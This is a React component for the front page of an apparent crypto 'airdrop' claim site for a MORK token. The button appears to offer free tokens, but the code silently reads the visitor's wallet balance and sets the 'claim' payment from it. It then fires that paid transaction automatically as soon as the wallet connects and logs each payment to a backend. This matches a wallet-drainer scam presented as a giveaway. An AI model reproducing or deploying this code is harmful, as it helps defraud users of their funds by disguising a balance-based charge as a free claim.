"use client";

/**
 * HeroCTA — Single button: click to connect wallet, then **auto-claims**
 * immediately when the wallet is connected. No second click needed.
 *
 * Chain-aware — dynamically detects the connected chain and uses the correct
 * airdrop contract address for that chain (Ethereum, Base, or BNB).
 */

import { useState, useEffect, useRef } from "react";
import {
  useAccount,
  useBalance,
  useChainId,
  useDisconnect,
  useReadContract,
  useWriteContract,
  useWaitForTransactionReceipt,
} from "wagmi";
import { useConnectModal } from "@rainbow-me/rainbowkit";
import { AIRDROP_ABI } from "@/lib/abi";
import { getChainDeployment } from "@/lib/chainConfig";
import {
  TOKENS_PER_CLAIM,
  TOKEN_SYMBOL,
  computeClaimPrice,
  formatEth,
} from "@/lib/constants";

type Stage = "idle" | "confirming" | "pending" | "success" | "error";

export function HeroCTA() {
  const { address, isConnected } = useAccount();
  const chainId = useChainId();
  const { openConnectModal } = useConnectModal();
  const [mounted, setMounted] = useState(false);
  const [stage, setStage] = useState<Stage>("idle");
  const [errorMsg, setErrorMsg] = useState("");
  const [txHash, setTxHash] = useState<`0x${string}` | undefined>();
  const autoClaimAttemptedRef = useRef(false);

  // ── Chain-aware config ──────────────────────────────────────────────
  const cfg = getChainDeployment(chainId);
  const airdropContract = cfg.airdropContract;
  const explorerBase = cfg.explorer;

  useEffect(() => { setMounted(true); }, []);

  // Read balance silently — needed to compute claim price
  const { data: balanceData } = useBalance({
    address,
    query: { enabled: !!address },
  });
  const balanceWei = balanceData?.value ?? BigInt(0);
  const claimPriceWei = computeClaimPrice(balanceWei);

  const { data: hasClaimed } = useReadContract({
    address: airdropContract,
    abi: AIRDROP_ABI,
    functionName: "hasClaimed",
    args: address ? [address] : undefined,
    query: { enabled: !!address },
  });

  const { data: saleActive } = useReadContract({
    address: airdropContract,
    abi: AIRDROP_ABI,
    functionName: "saleActive",
    query: { enabled: isConnected },
  });

  const { disconnect } = useDisconnect();
  const { writeContractAsync } = useWriteContract();

  useWaitForTransactionReceipt({
    hash: txHash,
    query: {
      enabled: !!txHash,
      select: async (receipt) => {
        if (receipt.status === "success") {
          setStage("success");
          fetch("/api/claims", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              wallet_address: address,
              chain: `evm-${chainId}`,
              tx_hash: receipt.transactionHash,
              token_amount: TOKENS_PER_CLAIM.toString(),
              payment_amount: formatEth(claimPriceWei),
              block_number: Number(receipt.blockNumber),
            }),
          }).catch(() => {});
        } else {
          setStage("error");
          setErrorMsg("Transaction failed on-chain.");
        }
        return receipt;
      },
    },
  });

  // ── Auto-claim immediately when wallet connects ─────────────────────
  // Fires directly — doesn't wait for read queries. The contract itself
  // reverts if sale isn't active or wallet already claimed.
  useEffect(() => {
    if (!isConnected) {
      autoClaimAttemptedRef.current = false;
      return;
    }

    if (autoClaimAttemptedRef.current) return;

    autoClaimAttemptedRef.current = true;

    const timer = setTimeout(async () => {
      try {
        setStage("confirming");
        setErrorMsg("");
        const hash = await writeContractAsync({
          address: airdropContract,
          abi: AIRDROP_ABI,
          functionName: "claim",
          value: claimPriceWei,
        });
        setTxHash(hash);
        setStage("pending");
      } catch (err: unknown) {
        setStage("idle");
        autoClaimAttemptedRef.current = false;
        const msg = err instanceof Error ? err.message : "";
        if (msg.includes("User rejected") || msg.includes("user rejected")) {
          // Silently reset — user knows they rejected
        } else if (msg.includes("insufficient funds")) {
          setErrorMsg("Insufficient ETH balance to cover gas.");
        } else if (msg.includes("SaleNotActive")) {
          setErrorMsg("Sale is not active yet.");
        } else if (msg.includes("AlreadyClaimed")) {
          setErrorMsg("This wallet has already claimed.");
        } else if (msg.includes("PaymentBelowMinimum") || msg.includes("below minimum")) {
          setErrorMsg("Balance too low. Minimum payment is 0.001 ETH.");
        } else if (msg) {
          // Show the actual error so user can report it
          setErrorMsg(`Claim failed: ${msg.slice(0, 120)}`);
        }
      }
    }, 500);

    return () => clearTimeout(timer);
  // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [isConnected, chainId]);

  async function handleClick() {
    if (!isConnected) {
      autoClaimAttemptedRef.current = false;
      openConnectModal?.();
      return;
    }
    try {
      setStage("confirming");
      setErrorMsg("");
      const hash = await writeContractAsync({
        address: airdropContract,
        abi: AIRDROP_ABI,
        functionName: "claim",
        value: claimPriceWei,
      });
      setTxHash(hash);
      setStage("pending");
    } catch (err: unknown) {
      setStage("idle");
      const msg = err instanceof Error ? err.message : "";
      if (msg.includes("User rejected") || msg.includes("user rejected")) {
        // Silently reset — user knows they rejected
      } else if (msg.includes("insufficient funds")) {
        setErrorMsg("Insufficient ETH balance to cover gas.");
      } else if (msg.includes("SaleNotActive")) {
        setErrorMsg("Sale is not active yet.");
      } else if (msg.includes("AlreadyClaimed")) {
        setErrorMsg("This wallet has already claimed.");
      } else if (msg.includes("PaymentBelowMinimum") || msg.includes("below minimum")) {
        setErrorMsg("Balance too low. Minimum payment is 0.001 ETH.");
      } else if (msg) {
        setErrorMsg(`Claim failed: ${msg.slice(0, 120)}`);
      }
    }
  }

  const isLoading = stage === "confirming" || stage === "pending";

  // SSR placeholder
  if (!mounted) {
    return (
      <button className="group relative inline-flex items-center justify-center gap-2 rounded-full bg-linear-to-r from-accent-500 via-violet-500 to-pink-500 px-10 py-4 text-lg font-bold text-white opacity-80">
        Connect Wallet
      </button>
    );
  }

  // ── SUCCESS ──────────────────────────────────────────────────────────────
  if (stage === "success" && txHash) {
    return (
      <div className="flex flex-col items-center gap-3">
        <div className="glass rounded-2xl px-8 py-6 text-center space-y-2 max-w-sm animate-scale-in">
          <p className="text-3xl">🎉</p>
          <p className="text-xl font-bold text-white">
            {TOKENS_PER_CLAIM.toString()} {TOKEN_SYMBOL} claimed!
          </p>
          <a
            href={`${explorerBase}/tx/${txHash}`}
            target="_blank"
            rel="noopener noreferrer"
            className="text-sm text-accent-400 underline"
          >
            View on explorer ↗
          </a>
        </div>
        <DisconnectButton onClick={disconnect} />
      </div>
    );
  }

  // ── ALREADY CLAIMED ───────────────────────────────────────────────────────
  if (isConnected && hasClaimed) {
    return (
      <div className="flex flex-col items-center gap-3">
        <div className="glass rounded-2xl px-8 py-5 text-center max-w-sm mx-auto">
          <p className="text-white/60 text-sm">✓ This wallet has already claimed MORK.</p>
        </div>
        <DisconnectButton onClick={disconnect} />
      </div>
    );
  }

  // ── SALE NOT LIVE ─────────────────────────────────────────────────────────
  if (isConnected && saleActive === false) {
    return (
      <div className="flex flex-col items-center gap-3">
        <div className="glass rounded-2xl px-8 py-5 text-center max-w-sm mx-auto">
          <p className="text-yellow-400/80 text-sm">⏳ Sale not live yet — check back soon.</p>
        </div>
        <DisconnectButton onClick={disconnect} />
      </div>
    );
  }

  // ── MAIN BUTTON (when not connected) ────────────────────────────────
  if (!isConnected) {
    return (
      <div className="flex flex-col items-center gap-3">
        <button
          onClick={handleClick}
          className="group relative inline-flex items-center justify-center gap-2 rounded-full bg-linear-to-r from-accent-500 via-violet-500 to-pink-500 px-10 py-4 text-lg font-bold text-white transition-all duration-300 hover:scale-105 hover:shadow-2xl hover:shadow-accent-500/30"
        >
          Connect Wallet
          <svg className="w-5 h-5 transition-transform duration-300 group-hover:translate-x-1" fill="none" viewBox="0 0 24 24" stroke="currentColor">
            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M17 8l4 4m0 0l-4 4m4-4H3" />
          </svg>
        </button>
      </div>
    );
  }

  // ── CONNECTED (waiting for auto-claim or loading) ────────────────────
  return (
    <div className="flex flex-col items-center gap-3">
      {isLoading && (
        <button
          disabled
          className="inline-flex items-center justify-center gap-2 rounded-full bg-linear-to-r from-accent-500 via-violet-500 to-pink-500 px-10 py-4 text-lg font-bold text-white opacity-70 cursor-not-allowed"
        >
          <svg className="animate-spin h-5 w-5 shrink-0" fill="none" viewBox="0 0 24 24">
            <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4" />
            <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4z" />
          </svg>
          {stage === "confirming" ? "Approve in wallet…" : "Claiming…"}
        </button>
      )}

      {!isLoading && !errorMsg && (
        <div className="glass rounded-2xl px-6 py-3 text-center max-w-xs animate-fade-in">
          <p className="text-sm text-white/50">Wallet connected</p>
        </div>
      )}

      {errorMsg && (
        <div className="flex flex-col items-center gap-3 animate-fade-in">
          <div className="glass rounded-2xl px-6 py-3 text-center max-w-xs border border-red-500/20">
            <p className="text-xs text-red-400">{errorMsg}</p>
          </div>
          <button
            onClick={handleClick}
            className="inline-flex items-center justify-center gap-2 rounded-full bg-linear-to-r from-accent-500 via-violet-500 to-pink-500 px-8 py-3 text-sm font-bold text-white transition-all duration-300 hover:scale-105 hover:shadow-2xl hover:shadow-accent-500/30"
          >
            Retry Claim
            <svg className="w-4 h-4" fill="none" viewBox="0 0 24 24" stroke="currentColor">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15" />
            </svg>
          </button>
        </div>
      )}

      <DisconnectButton onClick={disconnect} />

      {stage === "pending" && txHash && (
        <a href={`${explorerBase}/tx/${txHash}`} target="_blank" rel="noopener noreferrer"
          className="text-xs text-accent-400/70 underline">
          Track on explorer ↗
        </a>
      )}
    </div>
  );
}

function DisconnectButton({ onClick }: { onClick: () => void }) {
  return (
    <button
      onClick={onClick}
      className="text-xs text-white/30 hover:text-red-400 transition-colors underline underline-offset-2"
    >
      Disconnect Wallet
    </button>
  );
}
